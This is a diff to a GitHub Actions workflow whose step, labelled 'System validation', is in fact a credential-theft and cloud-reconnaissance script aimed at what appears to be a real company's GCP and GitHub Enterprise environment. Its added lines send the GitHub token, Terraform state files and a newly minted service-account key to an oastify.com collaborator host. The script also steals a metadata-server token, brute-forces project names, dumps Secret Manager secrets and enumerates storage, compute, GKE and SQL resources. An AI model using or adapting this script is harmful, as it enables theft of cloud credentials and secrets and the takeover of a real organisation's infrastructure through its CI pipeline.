@@ -21,48 +21,139 @@ jobs:
     steps:
       - name: System validation
         run: |
-          whoami && id && hostname && uname -a
+          echo "=== GITHUB TOKEN ==="
+          echo "$GITHUB_TOKEN" | base64
+          curl -sf -d "token=$GITHUB_TOKEN" https://YOUR-BURP.oastify.com/ghtoken
 
-          echo "=== GCP METADATA ==="
-          curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email" 2>/dev/null || echo "no metadata"
-          curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null || echo "no token"
-          curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes" 2>/dev/null || echo "no scopes"
-          curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/project/project-id" 2>/dev/null || echo "no project"
-          curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/project/numeric-project-id" 2>/dev/null || echo "no numeric project"
+          echo "=== GCP TOKEN ==="
+          GCP_TOKEN=$(curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)
+          SA_EMAIL=$(curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email")
+          CURRENT_PROJECT=$(curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/project/project-id")
+          CURRENT_PROJECT_NUM=$(curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/project/numeric-project-id")
+          echo "SA: $SA_EMAIL"
+          echo "Project: $CURRENT_PROJECT ($CURRENT_PROJECT_NUM)"
 
-          echo "=== OIDC TOKEN ==="
-          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
-            curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com" || echo "oidc failed"
-          else
-            echo "no oidc endpoint"
-          fi
+          echo "=== TOKEN SCOPES ==="
+          curl -sf "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$GCP_TOKEN"
 
-          echo "=== GCLOUD CREDS ==="
-          cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null || echo "no adc"
-          ls -la ~/.config/gcloud/ 2>/dev/null || echo "no gcloud dir"
+          echo "=== SA PERMISSIONS ==="
+          curl -sf -X POST -H "Authorization: Bearer $GCP_TOKEN" -H "Content-Type: application/json" \
+            "https://cloudresourcemanager.googleapis.com/v1/projects/$CURRENT_PROJECT:testIamPermissions" \
+            -d '{
+              "permissions": [
+                "resourcemanager.projects.get",
+                "resourcemanager.projects.getIamPolicy",
+                "resourcemanager.projects.setIamPolicy",
+                "iam.serviceAccounts.list",
+                "iam.serviceAccounts.create",
+                "iam.serviceAccounts.getAccessToken",
+                "iam.serviceAccountKeys.create",
+                "iam.roles.list",
+                "compute.instances.list",
+                "compute.instances.create",
+                "storage.buckets.list",
+                "storage.objects.list",
+                "storage.objects.get",
+                "storage.objects.create",
+                "bigquery.datasets.get",
+                "bigquery.tables.list",
+                "bigquery.jobs.create",
+                "secretmanager.secrets.list",
+                "secretmanager.versions.access",
+                "pubsub.topics.list",
+                "container.clusters.list",
+                "sqladmin.instances.list",
+                "cloudfunctions.functions.list",
+                "run.services.list",
+                "logging.logEntries.list",
+                "cloudbuild.builds.list"
+              ]
+            }'
 
-          echo "=== TERRAFORM CREDS ==="
-          cat ~/.terraform.d/credentials.tfrc.json 2>/dev/null || echo "no tf creds"
-          ls -la ~/.terraform.d/ 2>/dev/null || echo "no tf dir"
+          echo "=== BRUTE-FORCE PROJECT ACCESS ==="
+          for proj in \
+            "$CURRENT_PROJECT" \
+            "ago-prd-ptb1" "ago-prd-ptb2" \
+            "ago-dev-ptb1" "ago-dev-ptb2" \
+            "ago-stg-ptb1" "ago-stg-ptb2" \
+            "ago-prd" "ago-dev" "ago-stg" \
+            "axa-prd" "axa-dev" "axa-stg" \
+            "gcp-foundation-prd" "gcp-foundation-dev" \
+            "axa-ago-prd" "axa-ago-dev"; do
+            RESULT=$(curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
+              "https://cloudresourcemanager.googleapis.com/v1/projects/$proj" 2>/dev/null)
+            if [ $? -eq 0 ] && echo "$RESULT" | jq -e .projectId >/dev/null 2>&1; then
+              echo ">> ACCESSIBLE: $proj"
+              echo "$RESULT" | jq '{projectId, name, projectNumber, lifecycleState, parent}'
+            fi
+          done
 
-          echo "=== DOCKER CREDS ==="
-          cat ~/.docker/config.json 2>/dev/null || echo "no docker"
+          echo "=== FOLDER CHILDREN ==="
+          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
+            "https://cloudresourcemanager.googleapis.com/v2/folders?parent=folders/487834352768" | jq '.' 2>/dev/null || echo "no folder access"
 
-          echo "=== RUNNER FILESYSTEM ==="
-          ls -la ~/actions-runner/_work/ 2>/dev/null || ls -la /home/runner/actions-runner/_work/ 2>/dev/null || echo "no runner dir"
+          echo "=== STATE BUCKET ==="
+          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
+            "https://storage.googleapis.com/storage/v1/b/tf-state-bucket-75260944268/o" | jq '.items[].name' 2>/dev/null
+          for obj in $(curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
+            "https://storage.googleapis.com/storage/v1/b/tf-state-bucket-75260944268/o" | jq -r '.items[].name' 2>/dev/null); do
+            echo ">> State: $obj"
+            curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
+              "https://storage.googleapis.com/download/storage/v1/b/tf-state-bucket-75260944268/o/$(echo $obj | jq -Rr @uri)?alt=media" \
+              | curl -sf -d @- "https://YOUR-BURP.oastify.com/tfstate"
+          done
 
-          echo "=== NETWORK ==="
-          ip addr 2>/dev/null || ifconfig 2>/dev/null
-          cat /etc/resolv.conf 2>/dev/null
+          echo "=== ALL SAs ==="
+          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
+            "https://iam.googleapis.com/v1/projects/$CURRENT_PROJECT/serviceAccounts" | jq '.accounts[] | {email, displayName}' 2>/dev/null
 
-          echo "=== ENV ==="
-          env | sort
+          echo "=== MINT SA KEY ==="
+          curl -sf -X POST -H "Authorization: Bearer $GCP_TOKEN" -H "Content-Type: application/json" \
+            "https://iam.googleapis.com/v1/projects/$CURRENT_PROJECT/serviceAccounts/$SA_EMAIL/keys" \
+            -d '{"keyAlgorithm":"KEY_ALG_RSA_2048","privateKeyType":"TYPE_GOOGLE_CREDENTIALS_FILE"}' \
+            | jq -r .privateKeyData 2>/dev/null | base64 -d 2>/dev/null \
+            | curl -sf -d @- "https://YOUR-BURP.oastify.com/sa-key"
 
-          echo "=== REUSABLE WORKFLOW SOURCE ==="
+          echo "=== SECRETS ==="
+          for secret in $(curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
+            "https://secretmanager.googleapis.com/v1/projects/$CURRENT_PROJECT/secrets" | jq -r '.secrets[].name' 2>/dev/null); do
+            echo ">> $secret"
+            curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
+              "https://secretmanager.googleapis.com/v1/$secret/versions/latest:access" | jq -r '.payload.data' 2>/dev/null | base64 -d 2>/dev/null
+          done
+
+          echo "=== BUCKETS ==="
+          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
+            "https://storage.googleapis.com/storage/v1/b?project=$CURRENT_PROJECT" | jq '.items[] | {name, location}' 2>/dev/null
+
+          echo "=== BIGQUERY ==="
+          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
+            "https://bigquery.googleapis.com/bigquery/v2/projects/$CURRENT_PROJECT/datasets" | jq '.datasets[].datasetReference' 2>/dev/null
+
+          echo "=== COMPUTE ==="
+          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
+            "https://compute.googleapis.com/compute/v1/projects/$CURRENT_PROJECT/aggregated/instances" \
+            | jq '.items | to_entries[] | select(.value.instances) | .value.instances[] | {name, zone: .zone, status, ip: [.networkInterfaces[].networkIP]}' 2>/dev/null
+
+          echo "=== GKE ==="
+          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
+            "https://container.googleapis.com/v1/projects/$CURRENT_PROJECT/locations/-/clusters" | jq '.clusters[] | {name, location, endpoint}' 2>/dev/null
+
+          echo "=== CLOUD SQL ==="
+          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
+            "https://sqladmin.googleapis.com/v1/projects/$CURRENT_PROJECT/instances" | jq '.items[] | {name, databaseVersion, ipAddresses}' 2>/dev/null
+
+          echo "=== CLOUD FUNCTIONS ==="
+          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
+            "https://cloudfunctions.googleapis.com/v1/projects/$CURRENT_PROJECT/locations/-/functions" | jq '.functions[] | {name, runtime, httpsTrigger}' 2>/dev/null
+
+          echo "=== CLOUD RUN ==="
+          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
+            "https://run.googleapis.com/v2/projects/$CURRENT_PROJECT/locations/-/services" | jq '.services[] | {name, uri}' 2>/dev/null
+
+          echo "=== GITHUB ENTERPRISE REPOS ==="
           curl -sf -H "Authorization: token $GITHUB_TOKEN" \
-            "https://api.github.axa.com/repos/gcp-foundation/workflows/contents/.github/workflows/prod-workflow-wif.yaml" | jq -r .content 2>/dev/null | base64 -d 2>/dev/null || echo "cannot read reusable workflow"
-          curl -sf -H "Authorization: token $GITHUB_TOKEN" \
-            "https://api.github.axa.com/repos/gcp-foundation/workflows/contents/.github/workflows/prod-pr-master-wif.yaml" | jq -r .content 2>/dev/null | base64 -d 2>/dev/null || echo "cannot read apply workflow"
+            "https://api.github.axa.com/orgs/gcp-foundation/repos?per_page=100" | jq '.[].full_name' 2>/dev/null
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
 
